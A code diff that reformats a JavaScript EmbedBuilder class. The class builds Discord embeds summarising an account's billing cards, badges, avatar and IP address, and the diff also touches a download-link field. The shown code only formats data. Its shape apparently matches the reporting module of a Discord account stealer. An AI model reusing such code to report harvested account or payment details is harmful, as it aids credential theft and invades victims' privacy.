@@ -28,18 +28,18 @@ class EmbedBuilder {
      * @returns {Object} Discord embed
      */
     static createAccountEmbed(account, ip = 'Unknown') {
-        const billing = account.billings && account.billings.length > 0 ? 
-            account.billings.map(b => `${b.brand} *${b.last4}`).join(', ') : 
-            'None';
-        
-        const badges = account.badges && account.badges.length > 0 ? 
-            account.badges.join(', ') : 
-            'None';
-        
-        const avatarUrl = account.avatar ? 
-            `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` : 
-            'https://cdn.discordapp.com/embed/avatars/0.png';
-        
+        const billing =
+            account.billings && account.billings.length > 0
+                ? account.billings.map(b => `${b.brand} *${b.last4}`).join(', ')
+                : 'None';
+
+        const badges =
+            account.badges && account.badges.length > 0 ? account.badges.join(', ') : 'None';
+
+        const avatarUrl = account.avatar
+            ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
+            : 'https://cdn.discordapp.com/embed/avatars/0.png';
+
         return this.createBase({
             fields: [
                 {
@@ -120,7 +120,7 @@ class EmbedBuilder {
                 value: `[Click here to download](${downloadUrl})`,
                 inline: false
             });
-            
+
             // Also add the raw URL for copying if needed
             embed.fields.push({
                 name: ':clipboard: Direct URL',
